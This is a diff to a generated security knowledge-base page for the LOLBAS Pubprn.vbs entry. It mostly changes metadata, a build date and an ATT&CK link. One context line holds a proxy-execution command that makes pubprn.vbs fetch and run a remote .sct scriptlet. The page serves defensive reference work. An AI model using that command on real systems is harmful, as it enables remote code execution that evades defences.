@@ -4,7 +4,7 @@ framework: "lolbas"
 generated: "true"
 source_path: "yml/OSScripts/Pubprn.yml"
 source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Pubprn.yml"
-build_date: "2026-04-27 18:39:01"
+build_date: "2026-04-27 19:14:21"
 category: "OSScripts"
 aliases:
   - "Pubprn.vbs"
@@ -19,16 +19,7 @@ tags:
 
 [[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]
 
-# Pubprn.vbs
-
 Proxy execution with Pubprn.vbs
-
-## Metadata
-
-- Category: OSScripts
-- Created: 2018-05-25
-- Author: Oddvar Moe
-- Source Path: yml/OSScripts/Pubprn.yml
 
 ## Paths
 
@@ -48,7 +39,7 @@ pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}
 - Use Case: Proxy execution
 - Privileges: User
 - Operating System: Windows 10
-- ATT&CK: [[kb/attack/techniques/T1216-system_script_proxy_execution|T1216.001]]
+- ATT&CK: [[kb/attack/techniques/T1216-system_script_proxy_execution#^t1216001-pubprn|T1216.001: PubPrn]]
 
 ## Detections
 
